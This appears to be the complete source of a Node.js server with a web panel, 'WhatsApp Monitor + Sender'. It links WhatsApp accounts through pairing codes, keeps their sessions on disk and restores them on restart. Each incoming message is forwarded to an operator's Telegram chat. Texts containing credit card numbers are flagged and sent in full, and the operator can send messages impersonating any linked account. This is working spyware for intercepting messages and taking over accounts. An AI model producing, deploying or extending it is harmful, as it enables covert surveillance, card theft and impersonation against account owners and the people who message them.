// server.js
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('✅ Telegram bot ready');
} else console.warn('⚠️ Telegram not configured');

async function sendToTelegram(msg) {
    if (!telegramBot) return;
    try {
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
    } catch (err) { console.error('Telegram error:', err.message); }
}

function scanSensitive(text) {
    const patterns = [{
        name: '💳 Credit Card',
        regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
        mask: (m) => m.slice(0,4)+'-****-****-'+m.slice(-4)
    }];
    let detected = [];
    for (let p of patterns) {
        let match;
        while ((match = p.regex.exec(text)) !== null)
            detected.push({ type: p.name, masked: p.mask(match[0]) });
    }
    return detected;
}

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

const activeSessions = new Map();
const sessionsData = new Map();

function broadcastAccounts() {
    io.emit('accounts_list', Array.from(sessionsData.values()));
}

function updateSession(phone, status, device = null) {
    let old = activeSessions.get(phone) || {};
    old.status = status;
    if (device) old.device = device;
    activeSessions.set(phone, old);
    sessionsData.set(phone, {
        phone,
        status,
        device: old.device || 'Unknown',
        date: sessionsData.get(phone)?.date || new Date().toLocaleString()
    });
    broadcastAccounts();
}

async function createWhatsAppSession(phoneNumber, isRestore = false) {
    console.log(`[${phoneNumber}] Creating session...`);
    updateSession(phoneNumber, 'Connecting...');
    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
    });

    sock.ev.on('creds.update', saveCreds);
    let pairingRequested = false;

    sock.ev.on('connection.update', async (update) => {
        const conn = update.connection;
        console.log(`[${phoneNumber}] Connection state: ${conn}`);
        if (conn === 'open') {
            let device = sock.user?.device || 'Mac Desktop';
            updateSession(phoneNumber, 'Connected', device);
            if (!state.creds.registered && !pairingRequested && !isRestore) {
                pairingRequested = true;
                setTimeout(async () => {
                    try {
                        const code = await sock.requestPairingCode(phoneNumber);
                        console.log(`[${phoneNumber}] Pairing code: ${code}`);
                        io.emit('pairing_code', { code, phoneNumber });
                        await sendToTelegram(`🔐 Pairing code for ${phoneNumber}: \`${code}\``);
                    } catch (err) {
                        console.error(`Pairing code failed: ${err.message}`);
                        io.emit('error', `Pairing failed for ${phoneNumber}`);
                        pairingRequested = false;
                        updateSession(phoneNumber, 'Pairing error');
                    }
                }, 3000);
            }
        } else if (conn === 'close') {
            updateSession(phoneNumber, 'Disconnected');
            setTimeout(() => createWhatsAppSession(phoneNumber, false), 60000);
        } else if (conn === 'connecting') {
            updateSession(phoneNumber, 'Connecting...');
        }
    });

    // Fallback: request code after 15 seconds if not already
    setTimeout(async () => {
        if (!state.creds.registered && !pairingRequested && !isRestore) {
            console.log(`[${phoneNumber}] Fallback: requesting pairing code`);
            pairingRequested = true;
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                io.emit('pairing_code', { code, phoneNumber });
                await sendToTelegram(`🔐 Pairing code for ${phoneNumber}: \`${code}\``);
            } catch (err) {
                console.error(`Fallback pairing failed: ${err.message}`);
                io.emit('error', `Pairing failed for ${phoneNumber}`);
                pairingRequested = false;
                updateSession(phoneNumber, 'Pairing error');
            }
        }
    }, 15000);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (msg.message && !msg.key.fromMe) {
                let text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                if (!text) continue;
                const sender = msg.pushName || msg.key.remoteJid;
                const time = new Date().toLocaleString('en-US');
                await sendToTelegram(`📩 *From:* ${sender}\n📱 *On account:* ${phoneNumber}\n⏰ ${time}\n💬 ${text.substring(0,500)}`);
                const sensitive = scanSensitive(text);
                if (sensitive.length)
                    await sendToTelegram(`🚨 *Sensitive data detected* 🚨\n${sensitive.map(s=>s.masked).join('\n')}\n${text}`);
            }
        }
    });

    return sock;
}

async function restoreSessions() {
    const dir = path.join(__dirname, 'auth_sessions');
    if (!fs.existsSync(dir)) return;
    const phones = fs.readdirSync(dir).filter(f => f !== '.DS_Store');
    for (const phone of phones) {
        try {
            const sock = await createWhatsAppSession(phone, true);
            activeSessions.set(phone, { sock, status: 'Connected', device: 'Restored' });
            updateSession(phone, 'Connected', 'Restored');
            await sendToTelegram(`✅ Session restored for ${phone}`);
        } catch (err) { console.error(`Restore failed for ${phone}:`, err); }
    }
}

async function sendMessage(fromPhone, toNumber, text) {
    const session = activeSessions.get(fromPhone);
    if (!session || session.status !== 'Connected') throw new Error('Sender not connected');
    let jid = toNumber.replace(/\D/g, '') + '@s.whatsapp.net';
    await session.sock.sendMessage(jid, { text });
    await sendToTelegram(`📨 *Message sent* from ${fromPhone} to ${toNumber}\n✏️ ${text}`);
}

// HTML page (full, without template literal nesting issues)
const HTML_PAGE = `<!DOCTYPE html>
<html dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>WhatsApp Monitor + Sender</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background:#075E54; font-family: 'Segoe UI'; padding:20px; margin:0; }
        .container { max-width:900px; margin:auto; background:white; border-radius:20px; padding:30px; }
        h1,h2 { color:#075E54; text-align:center; }
        input,select,textarea,button { width:100%; padding:12px; margin:8px 0; border-radius:8px; border:1px solid #ddd; box-sizing:border-box; font-size:16px; }
        button { background:#25D366; color:white; font-weight:bold; border:none; cursor:pointer; }
        .status { padding:10px; border-radius:8px; margin:10px 0; display:none; }
        .success { background:#d4edda; color:#155724; display:block; }
        .error { background:#f8d7da; color:#721c24; display:block; }
        .info { background:#e2f0fb; color:#0c5460; display:block; }
        .accounts-list { max-height:300px; overflow-y:auto; margin:20px 0; }
        .account-item { background:#f8f9fa; padding:12px; margin:8px 0; border-radius:8px; border-right:4px solid #25D366; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
        .status-connected { color:green; font-weight:bold; }
        .status-disconnected { color:red; }
        .code-box { font-size:28px; letter-spacing:5px; background:#f5f5f5; padding:15px; text-align:center; border-radius:8px; font-family:monospace; }
        .hidden { display:none; }
        hr { margin:20px 0; }
        .small-text { font-size:12px; color:#666; text-align:center; margin-top:20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>📱 WhatsApp Monitor + Sender</h1>
    <p>➕ Add account | 🟢 Status | ✉️ Send messages</p>
    <input type="tel" id="phone" placeholder="Phone number (e.g., 967776730674)">
    <button id="addBtn">➕ Add account</button>
    <div id="statusMsg" class="status"></div>
    <div id="codeSection" class="hidden"><div class="code-box" id="codeDisplay"></div><p>✨ Enter this code in WhatsApp (Linked devices)</p></div>

    <hr>
    <h2>📋 Linked accounts</h2>
    <div id="accountsList" class="accounts-list">No accounts yet.</div>

    <hr>
    <h2>✉️ Send WhatsApp message</h2>
    <select id="senderSelect"><option value="">-- Select sender account (must be connected) --</option></select>
    <input type="tel" id="recipient" placeholder="Recipient number (e.g., 966512345678)">
    <textarea id="msgText" rows="3" placeholder="Message text"></textarea>
    <button id="sendBtn">📨 Send</button>
    <div id="sendStatus" class="status"></div>
    <div class="small-text">  </div>
</div>

<script>
(function() {
    const socket = io();
    const addBtn = document.getElementById('addBtn');
    const phoneInput = document.getElementById('phone');
    const statusDiv = document.getElementById('statusMsg');
    const codeSection = document.getElementById('codeSection');
    const codeDisplay = document.getElementById('codeDisplay');
    const accountsDiv = document.getElementById('accountsList');
    const senderSelect = document.getElementById('senderSelect');
    const recipient = document.getElementById('recipient');
    const msgText = document.getElementById('msgText');
    const sendBtn = document.getElementById('sendBtn');
    const sendStatusDiv = document.getElementById('sendStatus');

    function showStatus(msg, type, target) {
        target = target || statusDiv;
        target.textContent = msg;
        target.className = 'status ' + type;
        setTimeout(function() {
            if (target === statusDiv) target.className = 'status';
        }, 5000);
    }

    addBtn.onclick = function() {
        let phone = phoneInput.value.trim().replace(/\\D/g, '');
        if (!phone || phone.length < 8) return showStatus('Invalid number', 'error');
        addBtn.disabled = true;
        addBtn.innerHTML = '⏳ Adding...';
        showStatus('Preparing session...', 'info');
        socket.emit('add_account', { phone: phone });
    };

    socket.on('pairing_code', function(data) {
        if (data.phoneNumber === phoneInput.value.trim().replace(/\\D/g, '')) {
            codeDisplay.innerHTML = data.code;
            codeSection.classList.remove('hidden');
            showStatus('Code ready - enter it in WhatsApp', 'success');
        }
    });

    socket.on('accounts_list', function(accounts) {
        if (!accounts.length) {
            accountsDiv.innerHTML = 'No accounts';
            senderSelect.innerHTML = '<option value="">-- Select sender account --</option>';
            return;
        }
        var html = '';
        var options = '<option value="">-- Select sender account --</option>';
        for (var i = 0; i < accounts.length; i++) {
            var acc = accounts[i];
            var statusClass = '';
            if (acc.status === 'Connected') statusClass = 'status-connected';
            else if (acc.status === 'Disconnected') statusClass = 'status-disconnected';
            html += '<div class="account-item"><div><strong>' + acc.phone + '</strong><br>' + acc.device + '<br>' + acc.date + '</div><div class="' + statusClass + '">' + acc.status + '</div></div>';
            if (acc.status === 'Connected') {
                options += '<option value="' + acc.phone + '">📱 ' + acc.phone + ' (Connected)</option>';
            } else {
                options += '<option value="' + acc.phone + '" disabled>📱 ' + acc.phone + ' (' + acc.status + ')</option>';
            }
        }
        accountsDiv.innerHTML = html;
        senderSelect.innerHTML = options;
    });

    socket.on('error', function(msg) {
        addBtn.disabled = false;
        addBtn.innerHTML = '➕ Add account';
        showStatus(msg, 'error');
    });
    socket.on('connect', function() {
        showStatus('Connected to server', 'success');
        socket.emit('request_accounts');
    });
    socket.on('disconnect', function() {
        showStatus('Disconnected', 'error');
    });

    sendBtn.onclick = function() {
        var from = senderSelect.value;
        var to = recipient.value.trim().replace(/\\D/g, '');
        var text = msgText.value.trim();
        if (!from) return showStatus('Select a sender account', 'error', sendStatusDiv);
        if (!to || to.length < 8) return showStatus('Invalid recipient number', 'error', sendStatusDiv);
        if (!text) return showStatus('Enter message text', 'error', sendStatusDiv);
        sendBtn.disabled = true;
        sendBtn.innerHTML = 'Sending...';
        socket.emit('send_message', { from: from, to: to, text: text });
    };
    socket.on('message_sent', function(data) {
        sendBtn.disabled = false;
        sendBtn.innerHTML = '📨 Send';
        if (data.success) {
            showStatus('Message sent successfully', 'success', sendStatusDiv);
            recipient.value = '';
            msgText.value = '';
        } else {
            showStatus('Failed: ' + data.error, 'error', sendStatusDiv);
        }
    });
})();
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

io.on('connection', (socket) => {
    console.log('Client connected');
    socket.on('request_accounts', () => socket.emit('accounts_list', Array.from(sessionsData.values())));
    socket.on('add_account', async ({ phone }) => {
        let clean = phone.replace(/\D/g, '');
        if (activeSessions.has(clean)) return socket.emit('error', 'Account already exists');
        try {
            let sock = await createWhatsAppSession(clean, false);
            activeSessions.set(clean, { sock, status: 'Connected' });
            updateSession(clean, 'Connected', 'New');
            await sendToTelegram(`✅ New WhatsApp account linked: ${clean}`);
        } catch(e) { socket.emit('error', e.message); }
    });
    socket.on('send_message', async ({ from, to, text }) => {
        try {
            await sendMessage(from, to, text);
            socket.emit('message_sent', { success: true });
        } catch(err) { socket.emit('message_sent', { success: false, error: err.message }); }
    });
});

process.on('uncaughtException', console.error);
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    await restoreSessions();
});
